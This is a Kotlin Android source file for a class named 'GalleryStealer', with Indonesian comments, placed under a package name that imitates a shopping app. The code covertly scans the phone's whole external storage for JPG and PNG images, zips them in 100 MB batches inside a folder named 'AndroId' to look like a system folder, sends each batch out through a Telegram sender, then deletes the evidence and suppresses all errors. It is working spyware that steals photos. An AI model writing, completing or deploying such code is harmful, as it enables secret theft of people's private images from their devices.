package com.shopee.gallery

import android.content.Context
import android.os.Environment
import kotlinx.coroutines.*
import java.io.*
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class GalleryStealer(private val ctx: Context) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val MAX_ZIP_SIZE = 100L * 1024 * 1024  // 100 MB

    // Folder output: /storage/emulated/0/AndroId (I besar)
    private val outDir = File(Environment.getExternalStorageDirectory(), "AndroId")
    private val sentLog = File(outDir, ".sent.log")

    fun start() {
        if (!outDir.exists()) outDir.mkdirs()

        val sudahTerkirim = bacaLog()

        scope.launch {
            val semuaGambar = kumpulkanGambar(File(Environment.getExternalStorageDirectory()))

            var batchIndex = 1
            var currentZip: ZipOutputStream? = null
            var currentFile: File? = null
            var currentSize = 0L

            for (img in semuaGambar) {
                if (img.absolutePath in sudahTerkirim) continue
                if (!img.exists() || img.length() == 0L) continue

                // kalau zip baru / perlu file baru
                if (currentZip == null || currentSize + img.length() > MAX_ZIP_SIZE) {
                    currentZip?.close()
                    currentFile?.let { kirimKeTelegram(it) }

                    currentFile = File(outDir, "batch_${batchIndex}_${System.currentTimeMillis()}.zip")
                    currentZip = ZipOutputStream(BufferedOutputStream(FileOutputStream(currentFile)))
                    currentSize = 0L
                    batchIndex++
                }

                try {
                    val entry = ZipEntry(img.name + "_" + img.length())
                    currentZip!!.putNextEntry(entry)
                    FileInputStream(img).use { it.copyTo(currentZip!!) }
                    currentZip!!.closeEntry()
                    currentSize += img.length()
                    tulisLog(img.absolutePath)
                } catch (e: Exception) { /* skip file bermasalah */ }
            }

            currentZip?.close()
            currentFile?.let { kirimKeTelegram(it) }
        }
    }

    /** Kumpulkan semua file gambar dari storage */
    private fun kumpulkanGambar(root: File): List<File> {
        val hasil = mutableListOf<File>()
        val ext = setOf("jpg","jpeg","png")
        try {
            root.walkTopDown().onEnter { it.name != "AndroId" }.forEach { f ->
                if (f.isFile && f.extension.lowercase() in ext) hasil.add(f)
            }
        } catch (e: Exception) { }
        return hasil
    }

    private fun bacaLog(): MutableSet<String> {
        if (!sentLog.exists()) return mutableSetOf()
        return sentLog.readLines().toMutableSet()
    }

    private fun tulisLog(path: String) {
        try { sentLog.appendText("$path\n") } catch (e: Exception) {}
    }

    private fun kirimKeTelegram(zipFile: File) {
        try {
            TelegramSender.kirimZip(ctx, zipFile)
            // Hapus setelah terkirim biar ga numpuk
            zipFile.delete()
        } catch (e: Exception) { }
    }
}
